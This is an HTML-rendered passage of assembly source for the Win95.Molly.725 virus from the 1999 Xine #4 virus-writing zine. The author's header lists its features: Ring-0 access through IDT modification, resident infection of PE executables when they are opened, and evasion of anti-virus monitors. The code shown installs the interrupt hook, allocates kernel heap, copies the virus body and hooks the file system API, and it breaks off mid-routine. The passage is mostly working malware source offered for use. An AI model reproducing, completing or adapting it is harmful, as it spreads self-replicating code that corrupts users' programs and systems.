<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>molly.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #4 - Phile 215 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">

</span><span class="sc1">; [Win95.Molly.725] - An experimental specimen</span><span class="sc0">
</span><span class="sc1">; Copyright (c) 1999 by Billy Belcebu/iKX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Introduction ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is an  experimental virus. After Win32.Legacy i needed to do something</span><span class="sc0">
</span><span class="sc1">; small and functional. And here it is. This is my third Ring-0 virus,but the</span><span class="sc0">
</span><span class="sc1">; code scheme is different this time  from my  two  other R0's (Garaipena and</span><span class="sc0">
</span><span class="sc1">; PoshKiller). This virus was written just at  the  same time while i started</span><span class="sc0">
</span><span class="sc1">; to read Neuromancer, and as you can see, its  name comes from the girl with</span><span class="sc0">
</span><span class="sc1">; specular lens, that is one  of the main  characters of the book (hey, don't</span><span class="sc0">
</span><span class="sc1">; hesitate and read it!). </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Features ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       + Ring-0 virus by means of modifying the IDT</span><span class="sc0">
</span><span class="sc1">;       + Resident fast infector of PE files with EXE extension</span><span class="sc0">
</span><span class="sc1">;       + Infects when system opens file</span><span class="sc0">
</span><span class="sc1">;       + Overwriting virus (heheh, don't go mad, overwrite relocs) :)</span><span class="sc0">
</span><span class="sc1">;       + AntiMonitor tunneling (through InstallFileSystemApiHook structure)</span><span class="sc0">
</span><span class="sc1">;       + Heavy optimization (at least i've tried to), only 725 bytes</span><span class="sc0">
</span><span class="sc1">;       + My smallest virus so far :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Greetings ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       + Wintermute &amp;</span><span class="sc0">
</span><span class="sc1">;         zAxOn         - Thanx for pushing me to read Neuromancer... W0W!</span><span class="sc0">
</span><span class="sc1">;       + Qozah/29A     - Thanx for your help and support, dude</span><span class="sc0">
</span><span class="sc1">;       + Benny/29A     - I wanna hear that Czech group ;)</span><span class="sc0">
</span><span class="sc1">;       + Super/29A     - Why are you always in my greets? :)</span><span class="sc0">
</span><span class="sc1">;       + StarZer0/iKX  - sexsexsexsexsexsexsexsexsexsexsexsexsexsexsexsexsex</span><span class="sc0">
</span><span class="sc1">;       + b0z0/iKX      - Padania Libera rules!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (c) 1999 Billy Belcebu/iKX</span><span class="sc0">

        </span><span class="sc2">.586p</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

        </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">szTitle</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"[Win95.Molly."</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">0100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">0010</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">0001</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"]"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szMessage</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"First generation host"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"(c) 1999 Billy Belcebu/iKX"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">molly1</span><span class="sc0">
</span><span class="sc5">fakehost</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szMessage</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szTitle</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Win95.Molly                                                               </span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">molly</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'.molly'</span><span class="sc0">

</span><span class="sc1">; --- Virus mode</span><span class="sc0">

</span><span class="sc5">DEBUG</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">FALSE</span><span class="sc0">

</span><span class="sc1">; --- Some equates</span><span class="sc0">

</span><span class="sc5">d</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;[</span><span class="sc8">ebp</span><span class="sc4">]-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">rd</span><span class="sc0">                      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;[</span><span class="sc8">ebp</span><span class="sc4">]-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r0delta</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">rd_</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;[</span><span class="sc8">ebx</span><span class="sc4">]-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r0delta</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">virus_size</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc0">
</span><span class="sc5">heap_size</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">heap_end</span><span class="sc4">-</span><span class="sc5">virus_end</span><span class="sc0">
</span><span class="sc5">total_size</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc5">heap_size</span><span class="sc0">

</span><span class="sc5">TRUE</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">FALSE</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">PUSHAD_EDI</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ESI</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EBP</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ESP</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">PUSHAD_EBX</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EDX</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ECX</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EAX</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1Ch</span><span class="sc0">

</span><span class="sc5">PUSHAD_SIZE</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">

</span><span class="sc1">; --- VxD Functions</span><span class="sc0">

</span><span class="sc5">VMM_Get_DDB</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00010146h</span><span class="sc0">
</span><span class="sc5">IFSMgr_GetHeap</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0040000Dh</span><span class="sc0">
</span><span class="sc5">IFSMgr_RetHeap</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0040000Eh</span><span class="sc0">
</span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00400032h</span><span class="sc0">
</span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00400067h</span><span class="sc0">

</span><span class="sc1">; --- Hooked Functions</span><span class="sc0">

</span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">                      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">24h</span><span class="sc0">
</span><span class="sc5">IFSFN_RENAME</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">25h</span><span class="sc0">

</span><span class="sc1">; --- IFSMgr_Ring0_FileIO functions used</span><span class="sc0">

</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04300h</span><span class="sc0">
</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D500h</span><span class="sc0">
</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D700h</span><span class="sc0">
</span><span class="sc5">R0_READFILE</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D600h</span><span class="sc0">
</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D601h</span><span class="sc0">

</span><span class="sc1">; --- Macro land</span><span class="sc0">

</span><span class="sc5">dbg</span><span class="sc0">     </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">shit2do</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc5">shit2do</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">beep</span><span class="sc0">    </span><span class="sc9">macro</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B6h</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0012h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34DCh</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc5">l1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4680d</span><span class="sc0">
    </span><span class="sc5">l2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l2</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">l1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">VxDService</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VxDService</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">VxDJmp</span><span class="sc0">  </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">VxDService</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VxDService</span><span class="sc4">+</span><span class="sc2">8000h</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">; --- Virus entrypoint</span><span class="sc0">

</span><span class="sc5">molly1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gdelta</span><span class="sc0">

</span><span class="sc1">; --- Virus data</span><span class="sc0">

</span><span class="sc5">kernel</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">; --- Virus code </span><span class="sc0">

</span><span class="sc5">gdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta</span><span class="sc0">                           </span><span class="sc1">; Get a relative offset</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">05h</span><span class="sc0">                             </span><span class="sc1">; ECX = 5</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; (limit for 'GetImageBase')</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                         </span><span class="sc1">; ESI = Relative offset</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetImageBase</span><span class="sc0">                    </span><span class="sc1">; Get host's imagebase</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ModBase</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Store it</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                          </span><span class="sc1">; Avoid installation if we're</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                           </span><span class="sc1">; in WinNT</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">GimmeSomethingBaby</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">05h</span><span class="sc0">                             </span><span class="sc1">; ECX = 5</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; (limit for 'GetImageBase')</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetImageBase</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">kernel</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sidt</span><span class="sc0">    </span><span class="sc10">fword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Interrupt table to stack</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,((</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,((</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">NewInt3</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                          </span><span class="sc1">; Move MSW to LSW</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">GimmeSomethingBaby</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">00400000h</span><span class="sc0">                   </span><span class="sc1">; Get at runtime</span><span class="sc0">
</span><span class="sc5">ModBase</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,(</span><span class="sc5">fakehost</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)+</span><span class="sc2">00001000h</span><span class="sc0">  </span><span class="sc1">; Get at infection time</span><span class="sc0">
</span><span class="sc5">OldEIP</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">NewInt3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc5">dbg</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">&gt;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">kernel</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">                    </span><span class="sc1">; EAX = K32 imagebase</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc0">                          </span><span class="sc1">; Ptr to an unused field</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0CA5Eh</span><span class="sc0">           </span><span class="sc1">; Already installed?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">already_installed</span><span class="sc0">               </span><span class="sc1">; If so, exit</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0CA5Eh</span><span class="sc0">           </span><span class="sc1">; Case is here...</span><span class="sc0">

        </span><span class="sc7">fild</span><span class="sc0">    </span><span class="sc10">real8</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">@@1</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">     </span><span class="sc1">; Do u know any other way for</span><span class="sc0">
                                                </span><span class="sc1">; manipulate more than 4 bytes?</span><span class="sc0">
                                                </span><span class="sc1">; (without MMX, dork ;)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">total_size</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_GetHeap</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc7">fistp</span><span class="sc0">   </span><span class="sc10">real8</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">@@1</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">already_installed</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">virus_start</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+(</span><span class="sc5">FileSystemHook</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
